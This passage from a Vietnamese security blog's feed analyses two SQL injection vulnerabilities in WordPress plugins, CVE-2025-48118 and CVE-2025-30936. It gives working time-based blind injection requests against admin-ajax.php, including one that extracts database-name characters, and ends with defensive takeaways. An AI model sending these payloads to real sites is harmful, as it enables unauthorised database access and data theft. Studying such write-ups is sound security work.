0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi &lt;strong&gt;POST request&lt;/strong&gt; chứa payload SQLi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó câu query sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở đây có 2 nơi thực hiện query nên thời gian phản hồi sẽ tăng gấp đôi&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/time_resp.png&#34;&#xA;    alt=&#34;time response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả phản hồi khi khai thác thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta sử dụng &lt;strong&gt;subquery trong mệnh đề FROM&lt;/strong&gt; vì truy vấn con được coi như một bảng tạm thời. MySQL sẽ thực thi truy vấn con trước để tạo bảng tạm, sau đó mới thực hiện truy vấn chính. Khi so sánh theo từng row, &lt;code&gt;SLEEP&lt;/code&gt; chỉ chạy một lần trong quá trình khởi tạo bảng tạm, các lần so sánh tiếp theo sẽ không thực thi lại, nhờ đó tránh việc &lt;code&gt;SLEEP&lt;/code&gt; bị nhân nhiều lần.&lt;/p&gt;&#xA;&lt;p&gt;Ví dụ khi gửi request với payload này:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT SLEEP(5))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thời gian trả về tăng theo cấp số nhân&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-29-cve-2025-48118/search_2.png&#34;&#xA;    alt=&#34;search 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Thời gian phản hồi tăng theo cấp số nhân&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Điều kiện tiên quyết để &lt;strong&gt;dump được hết data&lt;/strong&gt; là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.&lt;/p&gt;&#xA;&lt;p&gt;Gửi request với &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=wxp_order_set_shipped&amp;amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sử dụng &lt;code&gt;SUBSTRING()&lt;/code&gt; để lấy ký tự đầu tiên của &lt;strong&gt;database name&lt;/strong&gt;, &lt;code&gt;IF()&lt;/code&gt; trả về &lt;code&gt;SLEEP(5)&lt;/code&gt; nếu ký tự đó là &lt;code&gt;0x77&lt;/code&gt;(&amp;lsquo;w&amp;rsquo;)&lt;/p&gt;&#xA;&lt;p&gt;Sử dụng hex encoding &lt;code&gt;w&lt;/code&gt; thành &lt;code&gt;0x77&lt;/code&gt; vì &lt;code&gt;order_id&lt;/code&gt; được lấy từ &lt;strong&gt;POST&lt;/strong&gt; request trong nên bị escape bởi &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; trong WordPress và bởi &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; kí tự đầu tiên đúng là &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-48118&lt;/strong&gt; trong plugin WordPress &lt;strong&gt;Woocommerce Partial Shipment&lt;/strong&gt; trước phiên bản &lt;strong&gt;3.3&lt;/strong&gt;, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;Chưa có bản vá chính thực nào cho lỗ hổng này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm soát kỹ input từ người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Luôn sử dụng &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; khi làm việc với database trong WordPress để tránh SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wc-partial-shipment/vulnerability/wordpress-woocommerce-partial-shipment-3-2-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Woocommerce Partial Shipment Plugin &amp;lt;= 3.2 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30936 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-28-cve-2025-30936/</link>
      <pubDate>Sun, 28 Sep 2025 20:51:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-28-cve-2025-30936/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Torod&lt;/strong&gt; của WordPress. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30936&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30936&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/torod/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Torod Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fixed in&lt;/strong&gt;: &amp;lt;= N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Torod&lt;/strong&gt;: v1.9&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ &lt;strong&gt;POST&lt;/strong&gt; request vào SQL query mà không có cơ chế quản kiểm soát chặt chẽ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-sink&#34;&gt;&lt;span&gt;Vulnerable Sink&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-sink&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;CVE này không có bản vá nên không thể sử dụng &lt;strong&gt;diff tool&lt;/strong&gt; để so sánh sự khác biệt giữa &lt;strong&gt;code lỗi&lt;/strong&gt; và &lt;strong&gt;code đã fix lỗi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global &lt;code&gt;$wpdb&lt;/code&gt;, ta search từ khóa này trong thư mục của plugin để tìm sink.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_sink.png&#34;&#xA;    alt=&#34;Search sink&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tìm vị trí sink trong code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Dữ liệu từ &lt;code&gt;$_POST[&#39;country_id&#39;]&lt;/code&gt; được đưa thẳng vào truy vấn SQL mà không có cơ chế kiểm soát hợp lệ. Việc chỉ sử dụng &lt;code&gt;sanitize_text_field()&lt;/code&gt; mới dừng lại ở mức &lt;strong&gt;escape chuỗi&lt;/strong&gt;, chứ không đảm bảo tính an toàn. Do đó, lỗ hổng SQLi có thể xảy ra.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Source: &lt;code&gt;$_POST[&#39;country_id&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sink: &lt;code&gt;$wpdb-&amp;gt;get_results(&amp;quot;SELECT * FROM $table_name WHERE country_id = $country_id&amp;quot;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Lỗ hổng nằm trong hàm &lt;code&gt;get_regions_and_cities&lt;/code&gt; của class &lt;code&gt;ajaxyk&lt;/code&gt; thuộc file &lt;strong&gt;inc/ajaxyk.php&lt;/strong&gt;. Để xác định nơi nó được gọi, ta tìm kiếm với từ khóa &lt;code&gt;get_regions_and_cities&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_1.png&#34;&#xA;    alt=&#34;Search 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tìm vị trí hàm get_regions_and_cities&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;get_regions_and_cities&lt;/code&gt; được construct của class &lt;code&gt;ajaxyk&lt;/code&gt; gọi làm callback của 2 action hook thông qua hàm &lt;code&gt;add_action&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_get_regions_and_cities&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Được viết theo cú pháp &lt;code&gt;wp_ajax_{$action}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Yêu cầu người dùng đăng nhập&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_get_regions_and_cities&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Được viết theo cú pháp &lt;code&gt;wp_ajax_nopriv_{$action}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Không yêu cầu người dùng đăng nhập&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Vì đây là lỗ hổng &lt;strong&gt;unauthenticated&lt;/strong&gt; nên ta chỉ quan tâm tới hook &lt;code&gt;wp_ajax_nopriv_get_regions_and_cities&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy khi gửi &lt;strong&gt;POST&lt;/strong&gt; request đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với tham số&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=wp_ajax_nopriv_get_regions_and_cities&amp;amp;country_id=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Callback &lt;code&gt;get_regions_and_cities&lt;/code&gt; được gọi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;country_id&lt;/code&gt; được lấy trực tiếp từ request và chèn vào SQL query.&lt;/li&gt;&#xA;&lt;li&gt;Query thực thi với payload độc hại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi &lt;strong&gt;POST request&lt;/strong&gt; chứa payload SQLi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=get_regions_and_cities&amp;amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó câu query sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/time_resp.png&#34;&#xA;    alt=&#34;Responsed time&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả phản hồi thời gian&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Dựa trên thời gian phản hồi =&amp;gt; payload hoạt động.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các technique có thể sử dụng trong trường hợp table rỗng&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;UNION&lt;/strong&gt;: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong mệnh đề WHERE&lt;/strong&gt;: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi &lt;code&gt;SLEEP()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery trong mệnh đề FROM&lt;/strong&gt;: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34;&#xA;    alt=&#34;SQL Excution 